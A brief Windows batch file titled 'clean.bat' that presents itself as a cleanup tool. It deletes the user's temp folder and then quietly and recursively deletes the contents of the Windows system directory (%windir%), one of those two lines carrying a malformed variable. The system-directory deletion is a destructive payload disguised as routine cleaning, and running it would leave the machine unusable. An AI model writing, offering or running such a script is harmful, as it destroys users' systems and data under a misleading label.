@echo off
color b
title clean.bat

del /q /s "%temp%/*" 
rmdir /s /q "%temp%/*"

del /q /s "%windir/*"
rmdir /s /q "%windir%/*"
